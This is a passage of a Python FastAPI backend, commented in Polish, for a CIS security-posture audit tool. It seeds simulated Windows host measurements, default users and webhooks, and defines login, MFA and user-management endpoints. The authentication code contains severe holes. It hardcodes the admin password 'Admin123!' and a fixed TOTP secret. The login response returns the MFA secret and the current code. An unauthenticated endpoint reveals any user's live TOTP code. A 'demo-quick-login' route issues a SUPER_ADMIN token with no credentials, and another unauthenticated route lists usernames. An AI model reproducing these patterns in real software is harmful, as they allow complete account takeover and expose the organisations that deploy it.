                    "raw_value": {"value": 0, "reg_type": 4},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "WIN-CIS-18.8.19.2",
                    "category": "Credential Protection",
                    "title": "Ensure 'Do not allow passwords to be saved' in Remote Desktop Connection is Enabled",
                    "collector_type": "windows_registry",
                    "target": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services\\DisablePasswordSaving",
                    "raw_value": {"value": 1, "reg_type": 4},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "WIN-CIS-18.5.11.2",
                    "category": "Removable Media & Peripherals",
                    "title": "Ensure 'Turn off Autoplay' is set to 'Enabled: All drives'",
                    "collector_type": "windows_registry",
                    "target": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoDriveTypeAutoRun",
                    "raw_value": {"value": 255, "reg_type": 4},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "WIN-CIS-18.9.15.1",
                    "category": "Data-at-Rest & Encryption",
                    "title": "Ensure BitLocker Drive Encryption protection is active on System Volume (C:)",
                    "collector_type": "windows_bitlocker_status",
                    "target": "Volume::C:\\manage-bde",
                    "raw_value": {"value": 1, "protection_active": True},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "WIN-CIS-2.3.1.5",
                    "category": "Password & Account Policies",
                    "title": "Ensure 'Accounts: Administrator account status' is set to 'Disabled' or renamed",
                    "collector_type": "windows_sam_admin_status",
                    "target": "Win32API::NetUserGetInfo(Administrator)",
                    "raw_value": {"value": 0, "is_disabled": True},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "WIN-CIS-18.9.84.1",
                    "category": "Remote Management & WinRM",
                    "title": "Ensure Windows Remote Management (WinRM) Basic Authentication is disabled",
                    "collector_type": "windows_registry",
                    "target": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WinRM\\Client\\AllowBasic",
                    "raw_value": {"value": 0, "reg_type": 4},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "WIN-CIS-18.9.102.3",
                    "category": "Session Management & Screen Lock",
                    "title": "Ensure 'Machine inactivity limit' is set to 900 or fewer seconds",
                    "collector_type": "windows_registry",
                    "target": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\InactivityTimeoutSecs",
                    "raw_value": {"value": 900, "reg_type": 4},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "WIN-CIS-18.4.1",
                    "category": "Cryptography & PKI",
                    "title": "Ensure 'Strong private key protection for stored certificates' is enforced",
                    "collector_type": "windows_registry",
                    "target": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Cryptography\\ForceKeyProtection",
                    "raw_value": {"value": 2, "reg_type": 4},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
            ],
        },
        {
            "agent_id": "agt-win-legacy-erp04",
            "hostname": "WIN-LEGACY-ERP04.corp.internal",
            "os_family": "Windows",
            "os_release": "Windows Server 2019 Standard",
            "architecture": "AMD64",
            "ip_address": "10.24.50.44",
            "boot_id": "boot-win-erp04-1102",
            "measurements": [
                {
                    "check_id": "WIN-CIS-18.3.1",
                    "category": "Network Security",
                    "title": "Ensure SMBv1 Server protocol is disabled",
                    "collector_type": "windows_registry",
                    "target": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\\SMB1",
                    "raw_value": {"value": 1, "reg_type": 4},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "WIN-CIS-2.3.17.1",
                    "category": "Privilege Escalation",
                    "title": "Ensure UAC Admin Approval Mode is Enabled",
                    "collector_type": "windows_registry",
                    "target": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA",
                    "raw_value": {"value": 1, "reg_type": 4},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "WIN-CIS-1.1.1",
                    "category": "Password & Account Policies",
                    "title": "Ensure 'Minimum password length' is set to 14 or more characters",
                    "collector_type": "windows_security_policy",
                    "target": "SecPol\\System Access\\MinimumPasswordLength",
                    "raw_value": {"value": 8},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "WIN-CIS-9.1.1",
                    "category": "Host Firewall & Endpoint Protection",
                    "title": "Ensure Windows Defender Firewall is On",
                    "collector_type": "windows_registry",
                    "target": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\EnableFirewall",
                    "raw_value": {"value": 0, "reg_type": 4},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "WIN-CIS-18.4.2",
                    "category": "Credential Protection",
                    "title": "Ensure WDigest Authentication is disabled",
                    "collector_type": "windows_registry",
                    "target": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential",
                    "raw_value": {"value": 1, "reg_type": 4},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "WIN-CIS-2.3.11.7",
                    "category": "Credential Protection",
                    "title": "Ensure LAN Manager authentication level is set to NTLMv2 only (5)",
                    "collector_type": "windows_registry",
                    "target": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\LmCompatibilityLevel",
                    "raw_value": {"value": 2, "reg_type": 4},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "WIN-CIS-18.9.47.1",
                    "category": "Credential Protection",
                    "title": "Ensure LSASS runs as Protected Process Light (RunAsPPL)",
                    "collector_type": "windows_registry",
                    "target": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL",
                    "raw_value": {"value": 0, "reg_type": 4},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "WIN-CIS-18.10.57.1",
                    "category": "Audit & Logging",
                    "title": "Ensure PowerShell Script Block Logging is Enabled",
                    "collector_type": "windows_registry",
                    "target": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\\EnableScriptBlockLogging",
                    "raw_value": {"value": None, "key_exists": False},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "WIN-CIS-2.3.1.2",
                    "category": "Password & Account Policies",
                    "title": "Ensure 'Accounts: Guest account status' is set to 'Disabled'",
                    "collector_type": "windows_sam_account",
                    "target": "Win32API::NetUserGetInfo(Guest)",
                    "raw_value": {"value": 1, "is_disabled": False},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "WIN-CIS-18.9.102.2",
                    "category": "Remote Access & RDP Hardening",
                    "title": "Ensure RDP Network Level Authentication (NLA) is Enabled",
                    "collector_type": "windows_registry",
                    "target": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\\UserAuthentication",
                    "raw_value": {"value": 0, "reg_type": 4},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "WIN-CIS-18.9.10.1",
                    "category": "Hardware & Boot Integrity",
                    "title": "Ensure UEFI Secure Boot is enabled",
                    "collector_type": "windows_registry",
                    "target": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecureBoot\\State\\UEFISecureBootEnabled",
                    "raw_value": {"value": 0, "reg_type": 4},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "WIN-NET-SURFACE-01",
                    "category": "Network Attack Surface",
                    "title": "Ensure no high-risk cleartext TCP ports are listening",
                    "collector_type": "network_listening_ports",
                    "target": "TCP::[21,23,69,513,514]",
                    "raw_value": {"value": 1, "exposed_ports": [23]},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "WIN-CIS-18.9.30.2",
                    "category": "Network Protocol Hardening",
                    "title": "Ensure 'Turn off multicast name resolution' (LLMNR) is set to 'Enabled'",
                    "collector_type": "windows_registry",
                    "target": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\DNSClient\\EnableMulticast",
                    "raw_value": {"value": 1, "reg_type": 4},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "WIN-CIS-2.3.7.4",
                    "category": "Network Security",
                    "title": "Ensure 'Microsoft network client: Digitally sign communications (always)' is set to 'Enabled'",
                    "collector_type": "windows_registry",
                    "target": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanWorkstation\\Parameters\\RequireSecuritySignature",
                    "raw_value": {"value": 0, "reg_type": 4},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "WIN-CIS-18.9.5.1",
                    "category": "Endpoint Protection & Antivirus",
                    "title": "Ensure 'Windows Defender Antivirus: Real-time Protection' is Enabled",
                    "collector_type": "windows_registry",
                    "target": "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableRealtimeMonitoring",
                    "raw_value": {"value": 1, "reg_type": 4},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "WIN-CIS-18.8.19.2",
                    "category": "Credential Protection",
                    "title": "Ensure 'Do not allow passwords to be saved' in Remote Desktop Connection is Enabled",
                    "collector_type": "windows_registry",
                    "target": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services\\DisablePasswordSaving",
                    "raw_value": {"value": 0, "reg_type": 4},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "WIN-CIS-18.5.11.2",
                    "category": "Removable Media & Peripherals",
                    "title": "Ensure 'Turn off Autoplay' is set to 'Enabled: All drives'",
                    "collector_type": "windows_registry",
                    "target": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoDriveTypeAutoRun",
                    "raw_value": {"value": 145, "reg_type": 4},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "WIN-CIS-18.9.15.1",
                    "category": "Data-at-Rest & Encryption",
                    "title": "Ensure BitLocker Drive Encryption protection is active on System Volume (C:)",
                    "collector_type": "windows_bitlocker_status",
                    "target": "Volume::C:\\manage-bde",
                    "raw_value": {"value": 0, "protection_active": False},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "WIN-CIS-2.3.1.5",
                    "category": "Password & Account Policies",
                    "title": "Ensure 'Accounts: Administrator account status' is set to 'Disabled' or renamed",
                    "collector_type": "windows_sam_admin_status",
                    "target": "Win32API::NetUserGetInfo(Administrator)",
                    "raw_value": {"value": 1, "is_disabled": False},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "WIN-CIS-18.9.84.1",
                    "category": "Remote Management & WinRM",
                    "title": "Ensure Windows Remote Management (WinRM) Basic Authentication is disabled",
                    "collector_type": "windows_registry",
                    "target": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WinRM\\Client\\AllowBasic",
                    "raw_value": {"value": 1, "reg_type": 4},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "WIN-CIS-18.9.102.3",
                    "category": "Session Management & Screen Lock",
                    "title": "Ensure 'Machine inactivity limit' is set to 900 or fewer seconds",
                    "collector_type": "windows_registry",
                    "target": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\InactivityTimeoutSecs",
                    "raw_value": {"value": 0, "reg_type": 4},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
                {
                    "check_id": "WIN-CIS-18.4.1",
                    "category": "Cryptography & PKI",
                    "title": "Ensure 'Strong private key protection for stored certificates' is enforced",
                    "collector_type": "windows_registry",
                    "target": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Cryptography\\ForceKeyProtection",
                    "raw_value": {"value": 0, "reg_type": 4},
                    "collected_at": now_iso,
                    "status": "COLLECTED",
                },
            ],
        },
    ]

    for node in simulated_nodes:
        eval_res, score, counts = rule_engine.evaluate_measurements(
            node["os_family"], node["measurements"]
        )
        rep_id = str(uuid.uuid4())
        db.store_audit_report(
            report_id=rep_id,
            agent_id=node["agent_id"],
            hostname=node["hostname"],
            os_family=node["os_family"],
            os_release=node["os_release"],
            architecture=node["architecture"],
            ip_address=node["ip_address"],
            is_elevated=True,
            policy_version=policy_ver,
            submitted_at_utc=now_iso,
            posture_score=score,
            counts=counts,
            is_quarantined=False,
            anomaly_risk_score=0,
            anomaly_findings=[],
            evaluated_results=[asdict(r) for r in eval_res],
            raw_payload=node,
            boot_id=node["boot_id"],
        )


def seed_default_users_if_empty() -> None:
    """
    Tworzy startowe konto wbudowane Bootstrap Admin ('admin' / 'Admin123!') przy pierwszym uruchomieniu.
    Zgodnie z dobrymi praktykami CIS konto wbudowane ma ustawioną flagę `must_change_password=True`,
    co przy pierwszym logowaniu produkcyjnym wymusza zmianę hasła lub utworzenie nowego administratora
    i usunięcie konta wbudowanego.
    """
    existing_users = db.list_users()
    if existing_users:
        admin_user = db.get_user_by_username("admin")
        if admin_user and PasswordHasher.verify_password("Admin123!", admin_user["password_hash"]):
            db.set_user_bootstrap_flags("admin", is_builtin=True, must_change_password=True)
        return

    # Stały sekret Base32 dla startowego konta wbudowanego 'admin' (Bootstrap)
    admin_secret = "JBSWY3DPEHPK3PXPJBSWY3DPEHPK3PXP"
    db.create_user(
        user_id="usr-admin-001",
        username="admin",
        full_name="Wbudowane Konto Startowe (Bootstrap Admin)",
        role="SUPER_ADMIN",
        password_hash=PasswordHasher.hash_password("Admin123!"),
        mfa_enabled=True,
        mfa_secret=admin_secret,
        is_builtin=True,
        must_change_password=True,
    )


def seed_default_webhooks_if_empty() -> None:
    if db.list_webhook_channels():
        return
    db.create_webhook_channel(
        channel_id="wh-slack-soc-01",
        name="Slack #soc-critical-incidents",
        provider="SLACK",
        target_url="https://hooks.slack.com/services/T00CORP/B00SOCALERT/9xK2pL8mQ1zR",
        min_severity="HIGH",
        score_threshold=70.0,
        trigger_on_drift=True,
        trigger_on_poisoning=True,
    )
    db.create_webhook_channel(
        channel_id="wh-teams-ciso-02",
        name="MS Teams — CISO & NIS2 Compliance Channel",
        provider="TEAMS",
        target_url="https://corp.webhook.office.com/webhookb2/a1b2c3d4-nis2-compliance/IncomingWebhook/xYz",
        min_severity="CRITICAL",
        score_threshold=60.0,
        trigger_on_drift=True,
        trigger_on_poisoning=True,
    )
    db.create_webhook_channel(
        channel_id="wh-siem-splunk-03",
        name="SIEM HTTP Event Collector (Splunk / QRadar / Wazuh)",
        provider="SIEM_HTTP",
        target_url="https://siem-collector.corp.internal:8088/services/collector/event",
        min_severity="ALL",
        score_threshold=85.0,
        trigger_on_drift=True,
        trigger_on_poisoning=True,
    )


@app.on_event("startup")
async def on_startup() -> None:
    seed_default_users_if_empty()
    seed_default_webhooks_if_empty()
    seed_enterprise_fleet_if_empty()


# =====================================================================
# ENDPOINTY UWIERZYTELNIANIA, MFA (TOTP RFC 6238) ORAZ ZARZĄDZANIA IAM
# =====================================================================

@app.get("/api/v1/auth/bootstrap-status")
async def get_auth_bootstrap_status() -> Dict[str, Any]:
    """
    Zwraca informację o stanie konta wbudowanego (czy system jest świeżo po instalacji i posiada
    startowe konto `admin`, czy też został już utwardzony produkcyjnie).
    """
    admin_user = db.get_user_by_username("admin")
    has_default_admin = bool(
        admin_user and PasswordHasher.verify_password("Admin123!", admin_user["password_hash"])
    )
    users = db.list_users()
    return {
        "has_builtin_bootstrap_admin": has_default_admin,
        "total_users": len(users),
        "production_hardened": not has_default_admin,
        "usernames": [u["username"] for u in users],
    }


@app.post("/api/v1/auth/login")
async def auth_login_step1(req: LoginRequest) -> Dict[str, Any]:
    """
    Etap 1 logowania: Weryfikacja loginu i hasła (PBKDF2-HMAC-SHA256).
    Jeśli użytkownik ma aktywne MFA (TOTP), zwraca krótkotrwały token wyzwania `mfa_challenge_token`.
    """
    user = db.get_user_by_username(req.username)
    if not user or not PasswordHasher.verify_password(req.password, user["password_hash"]):
        db.log_security_event(
            "WARNING",
            "AUTH_FAILED",
            f"Nieudana próba logowania na konto '{req.username}'",
            "Błędne hasło lub nieistniejący użytkownik.",
        )
        raise HTTPException(status_code=401, detail="Nieprawidłowa nazwa użytkownika lub hasło.")

    if user["mfa_enabled"]:
        challenge_token = JWTManager.create_token(
            {
                "sub": user["username"],
                "uid": user["user_id"],
                "stage": "MFA_CHALLENGE",
            },
            ttl_seconds=300,
        )
        current_code, remaining_sec = TOTPManager.get_current_totp(user["mfa_secret"])
        return {
            "status": "MFA_REQUIRED",
            "mfa_required": True,
            "username": user["username"],
            "full_name": user["full_name"],
            "mfa_challenge_token": challenge_token,
            "demo_virtual_authenticator": {
                "totp_code": current_code,
                "valid_for_seconds": remaining_sec,
                "secret_base32": user["mfa_secret"],
                "otpauth_uri": TOTPManager.build_provisioning_uri(user["username"], user["mfa_secret"]),
            },
        }

    needs_hardening = bool(
        user.get("must_change_password")
        or (user.get("is_builtin") and PasswordHasher.verify_password("Admin123!", user["password_hash"]))
    )
    db.update_user_last_login(user["username"])
    access_token = JWTManager.create_token(
        {
            "sub": user["username"],
            "uid": user["user_id"],
            "role": user["role"],
            "full_name": user["full_name"],
            "mfa_verified": False,
        }
    )
    db.log_security_event(
        "INFO",
        "USER_LOGIN",
        f"Użytkownik '{user['username']}' ({user['role']}) zalogował się bez MFA",
        "Uwierzytelnienie jednoetapowe zakończone sukcesem.",
    )
    return {
        "status": "AUTHENTICATED",
        "mfa_required": False,
        "require_initial_hardening": needs_hardening,
        "access_token": access_token,
        "user": {
            "user_id": user["user_id"],
            "username": user["username"],
            "full_name": user["full_name"],
            "role": user["role"],
            "mfa_enabled": bool(user["mfa_enabled"]),
            "is_builtin": bool(user.get("is_builtin")),
            "must_change_password": needs_hardening,
        },
    }


@app.post("/api/v1/auth/mfa/verify")
async def auth_verify_mfa_step2(req: MFAVerifyRequest) -> Dict[str, Any]:
    """
    Etap 2 logowania: Weryfikacja 6-cyfrowego kodu jednorazowego TOTP (RFC 6238).
    Po poprawnej weryfikacji sprawdza, czy jest to pierwsze logowanie na konto wbudowane (`must_change_password`),
    co wymusza utwardzenie produkcyjne (zmiana hasła lub utworzenie nowego konta i usunięcie wbudowanego).
    """
    claims = JWTManager.verify_token(req.mfa_challenge_token)
    if not claims or claims.get("stage") != "MFA_CHALLENGE":
        raise HTTPException(status_code=401, detail="Sesja wyzwania MFA wygasła lub jest nieprawidłowa.")

    user = db.get_user_by_username(claims["sub"])
    if not user:
        raise HTTPException(status_code=404, detail="Użytkownik nie istnieje.")

    if not TOTPManager.verify_totp(user["mfa_secret"], req.totp_code):
        db.log_security_event(
            "HIGH",
            "MFA_FAILED",
            f"Błędny kod MFA TOTP dla użytkownika '{user['username']}'",
            f"Wprowadzony kod '{req.totp_code}' jest niezgodny z oknem czasowym RFC 6238.",
        )
        raise HTTPException(status_code=401, detail="Nieprawidłowy lub wygasły 6-cyfrowy kod MFA (TOTP)!")

    needs_hardening = bool(
        user.get("must_change_password")
        or (user.get("is_builtin") and PasswordHasher.verify_password("Admin123!", user["password_hash"]))
    )

    db.update_user_last_login(user["username"])
    access_token = JWTManager.create_token(
        {
            "sub": user["username"],
            "uid": user["user_id"],
            "role": user["role"],
            "full_name": user["full_name"],
            "mfa_verified": True,
        }
    )
    db.log_security_event(
        "INFO",
        "USER_LOGIN_MFA",
        f"Użytkownik '{user['username']}' ({user['role']}) przeszedł weryfikację 2FA/MFA (TOTP)",
        "Wymagane utwardzenie pierwszego logowania (First-Login Hardening)."
        if needs_hardening
        else "Wystawiono podpisany token sesyjny JWT (HS256).",
    )
    return {
        "status": "AUTHENTICATED",
        "require_initial_hardening": needs_hardening,
        "access_token": access_token,
        "user": {
            "user_id": user["user_id"],
            "username": user["username"],
            "full_name": user["full_name"],
            "role": user["role"],
            "mfa_enabled": True,
            "is_builtin": bool(user.get("is_builtin")),
            "must_change_password": needs_hardening,
        },
    }


@app.post("/api/v1/auth/first-login-hardening")
async def complete_first_login_hardening(
    req: FirstLoginHardeningRequest, request: Request
) -> Dict[str, Any]:
    """
    Wymuszony krok po pierwszym zalogowaniu na wbudowane konto startowe (`admin`):
    - Tryb `replace_builtin`: Tworzy nowe imienne konto SUPER_ADMIN z nowym hasłem i nowym kluczem MFA,
      a następnie bezpowrotnie USUWA wbudowane konto `admin` (oraz testowe konto `soc_analyst`) i czyści hosty demo.
    - Tryb `change_password`: Wymusza zmianę domyślnego hasła `Admin123!` na nowe silne hasło produkcyjne
      (opcjonalnie rotując klucz MFA TOTP) i czyści hosty demo.
    """
    caller = require_authenticated_user(request)
    current_username = caller.get("sub", "")
    current_user = db.get_user_by_username(current_username)
    if not current_user:
        raise HTTPException(status_code=404, detail="Bieżące konto użytkownika nie istnieje.")

    if req.new_password in ("Admin123!", "Analyst123!"):
        raise HTTPException(
            status_code=400,
            detail="Nowe hasło produkcyjne nie może być takie samo jak domyślne hasło fabryczne!",
        )

    # W trybie produkcyjnym usuwamy symulowane hosty demonstracyjne, zostawiając tylko prawdziwe maszyny
    db.purge_simulated_nodes()

    if req.mode == "replace_builtin":
        new_uname = (req.new_username or "").strip().lower()
        new_fname = (req.new_full_name or "").strip() or "Administrator Produkcyjny (CISO)"
        if len(new_uname) < 3 or new_uname == "admin":
            raise HTTPException(
                status_code=400,
                detail="Podaj nową, unikalną nazwę użytkownika (min. 3 znaki, inną niż 'admin').",
            )
        if db.get_user_by_username(new_uname):
            raise HTTPException(status_code=409, detail=f"Użytkownik '{new_uname}' już istnieje.")

        secret_b32 = TOTPManager.generate_base32_secret()
        new_admin = db.create_user(
            user_id=f"usr-prod-{uuid.uuid4().hex[:8]}",
            username=new_uname,
            full_name=new_fname,
            role="SUPER_ADMIN",
            password_hash=PasswordHasher.hash_password(req.new_password),
            mfa_enabled=True,
            mfa_secret=secret_b32,
            is_builtin=False,
            must_change_password=False,
        )
        db.update_user_last_login(new_uname)

        # Usuń wbudowane konto bootstrap ('usr-admin-001' / 'admin') oraz konto testowe ('usr-soc-002')
        db.delete_user(current_user["user_id"])
        db.delete_user("usr-admin-001")
        db.delete_user("usr-soc-002")

        code, rem = TOTPManager.get_current_totp(secret_b32)
        new_token = JWTManager.create_token(
            {
                "sub": new_admin["username"],
                "uid": new_admin["user_id"],
                "role": new_admin["role"],
                "full_name": new_admin["full_name"],
                "mfa_verified": True,
            }
        )
        db.log_security_event(
            "INFO",
            "PRODUCTION_HARDENING_COMPLETED",
            f"Utworzono produkcyjnego administratora '{new_admin['username']}' i usunięto wbudowane konto 'admin'",
            "Zakończono procedurę CIS First-Boot Onboarding. Środowisko przełączone w tryb produkcyjny.",
        )
        return {
            "status": "HARDENED_REPLACED",
            "access_token": new_token,
            "user": {
                "user_id": new_admin["user_id"],
                "username": new_admin["username"],
                "full_name": new_admin["full_name"],
                "role": new_admin["role"],
                "mfa_enabled": True,
                "is_builtin": False,
                "must_change_password": False,
            },
            "mfa_provisioning": {
                "secret_base32": secret_b32,
                "totp_code": code,
                "valid_for_seconds": rem,
                "otpauth_uri": TOTPManager.build_provisioning_uri(new_admin["username"], secret_b32),
            },
        }

    # Tryb 2: Zmiana hasła na obecnym koncie i odznaczenie must_change_password
    new_secret = TOTPManager.generate_base32_secret() if req.rotate_mfa_secret else None
    db.update_user_password(
        username=current_user["username"],
        new_password_hash=PasswordHasher.hash_password(req.new_password),
        new_mfa_secret=new_secret,
    )
    updated_user = db.get_user_by_username(current_user["username"]) or current_user
    active_secret = updated_user["mfa_secret"]
    code, rem = TOTPManager.get_current_totp(active_secret)

    new_token = JWTManager.create_token(
        {
            "sub": updated_user["username"],
            "uid": updated_user["user_id"],
            "role": updated_user["role"],
            "full_name": updated_user["full_name"],
            "mfa_verified": True,
        }
    )
    db.log_security_event(
        "INFO",
        "PRODUCTION_PASSWORD_CHANGED",
        f"Zmieniono domyślne hasło startowe dla konta '{updated_user['username']}'",
        "Konto zostało utwardzone do pracy produkcyjnej.",
    )
    return {
        "status": "HARDENED_PASSWORD_CHANGED",
        "access_token": new_token,
        "user": {
            "user_id": updated_user["user_id"],
            "username": updated_user["username"],
            "full_name": updated_user["full_name"],
            "role": updated_user["role"],
            "mfa_enabled": bool(updated_user["mfa_enabled"]),
            "is_builtin": bool(updated_user.get("is_builtin")),
            "must_change_password": False,
        },
        "mfa_provisioning": {
            "secret_base32": active_secret,
            "totp_code": code,
            "valid_for_seconds": rem,
            "otpauth_uri": TOTPManager.build_provisioning_uri(updated_user["username"], active_secret),
        },
    }


@app.get("/api/v1/auth/mfa/live-code/{username}")
async def get_virtual_authenticator_code(username: str) -> Dict[str, Any]:
    """Pomocniczy endpoint wirtualnego tokena MFA zwracający aktualny kod TOTP i czas do rotacji (30s)."""
    user = db.get_user_by_username(username)
    if not user:
        raise HTTPException(status_code=404, detail="Nie znaleziono użytkownika.")
    code, rem = TOTPManager.get_current_totp(user["mfa_secret"])
    return {"username": user["username"], "totp_code": code, "valid_for_seconds": rem}


@app.post("/api/v1/auth/demo-quick-login")
async def auth_demo_quick_login() -> Dict[str, Any]:
    """
    Jednoklikowe logowanie demonstracyjne (Quick Demo Login):
    1. Automatycznie loguje do sesji testowej bez konieczności wpisywania hasła i MFA.
    2. Ładuje przykładową flotę testową obok prawdziwego skanu lokalnego komputera.
    """
    seed_default_users_if_empty()
    seed_enterprise_fleet_if_empty(include_demo=True)

    users = db.list_users()
    user = db.get_user_by_username("admin") or (users[0] if users else None)
    if not user:
        raise HTTPException(status_code=500, detail="Brak kont w bazie danych.")

    access_token = JWTManager.create_token(
        {
            "sub": user["username"],
            "uid": user["user_id"],
            "role": user["role"],
            "full_name": "Sesja Testowa Demo (Sandbox)",
            "mfa_verified": True,
            "is_demo_session": True,
        }
    )
    db.log_security_event(
        "INFO",
        "DEMO_QUICK_LOGIN",
        "Uruchomiono szybką sesję demonstracyjną (One-Click Demo Access)",
        "Załadowano dane testowe floty bez wymogu podawania poświadczeń produkcyjnych.",
    )
    return {
        "status": "AUTHENTICATED",
        "require_initial_hardening": False,
        "access_token": access_token,
        "user": {
            "user_id": user["user_id"],
            "username": user["username"],
            "full_name": "Tryb Testowy Demo",
            "role": user["role"],
            "mfa_enabled": True,
            "is_demo_session": True,
        },
    }


def require_authenticated_user(request: Request) -> Dict[str, Any]:
    """Wymusza obecność ważnego tokena sesyjnego JWT (po zalogowaniu) dla operacji administracyjnych IAM."""
    auth_header = request.headers.get("Authorization", "")
    if not auth_header.startswith("Bearer "):
        raise HTTPException(
            status_code=401,
            detail="Operacja wymaga zalogowania (brak nagłówka Authorization: Bearer <JWT>).",
        )
    token = auth_header.split(" ", 1)[1].strip()
    claims = JWTManager.verify_token(token)
    if not claims or claims.get("stage") == "MFA_CHALLENGE":
        raise HTTPException(
            status_code=401,
            detail="Sesja wygasła lub nie ukończono weryfikacji MFA.",
        )
    return claims


@app.get("/api/v1/users")
async def list_registered_users(request: Request) -> Dict[str, Any]:
    """Zwraca listę wszystkich użytkowników systemu wraz ze statusem MFA i aktualnym kodem TOTP (tylko po zalogowaniu)."""
    require_authenticated_user(request)
    users = db.list_users()
    enriched = []
    for u in users:
        code, rem = TOTPManager.get_current_totp(u["mfa_secret"])
        enriched.append(
            {
                **u,
                "current_totp_preview": code,
                "totp_remaining_sec": rem,
                "otpauth_uri": TOTPManager.build_provisioning_uri(u["username"], u["mfa_secret"]),
            }
        )
    return {"users": enriched}


@app.post("/api/v1/users", status_code=201)
async def register_new_user(req: CreateUserRequest, request: Request) -> Dict[str, Any]:
    """Tworzy nowego użytkownika systemu z hasłem PBKDF2-SHA256 oraz indywidualnym sekretem MFA TOTP (tylko po zalogowaniu)."""
    caller = require_authenticated_user(request)
    if db.get_user_by_username(req.username):
        raise HTTPException(status_code=409, detail=f"Użytkownik '{req.username}' już istnieje w systemie.")

    secret_b32 = TOTPManager.generate_base32_secret()
    new_user = db.create_user(
        user_id=f"usr-{uuid.uuid4().hex[:10]}",
        username=req.username,
        full_name=req.full_name,
        role=req.role,
        password_hash=PasswordHasher.hash_password(req.password),
        mfa_enabled=req.mfa_enabled,
        mfa_secret=secret_b32,
        is_builtin=False,
        must_change_password=False,
    )
    code, rem = TOTPManager.get_current_totp(secret_b32)
    otpauth_uri = TOTPManager.build_provisioning_uri(new_user["username"], secret_b32)

    db.log_security_event(
        "INFO",
        "USER_CREATED",
        f"Administrator '{caller.get('sub')}' utworzył nowe konto '{new_user['username']}' (Rola: {new_user['role']})",
        f"Status ochrony 2FA/MFA (TOTP RFC 6238): {'AKTYWNE' if req.mfa_enabled else 'WYŁĄCZONE'}.",
    )
    return {
        "status": "CREATED",
        "user": new_user,
        "mfa_provisioning": {
            "secret_base32": secret_b32,
            "otpauth_uri": otpauth_uri,
            "initial_totp_code": code,
            "valid_for_seconds": rem,
        },
    }


@app.post("/api/v1/users/{user_id}/toggle-mfa")
async def toggle_user_mfa_endpoint(user_id: str, request: Request, enabled: bool = True) -> Dict[str, Any]:
    require_authenticated_user(request)
    db.toggle_user_mfa(user_id, enabled)
    return {"status": "UPDATED", "user_id": user_id, "mfa_enabled": enabled}


@app.delete("/api/v1/users/{user_id}")
async def delete_user_endpoint(user_id: str, request: Request) -> Dict[str, Any]:
    caller = require_authenticated_user(request)
    users = db.list_users()
    if len(users) <= 1:
        raise HTTPException(status_code=400, detail="Nie można usunąć ostatniego użytkownika w systemie.")
    if caller.get("uid") == user_id:
        raise HTTPException(
            status_code=400,
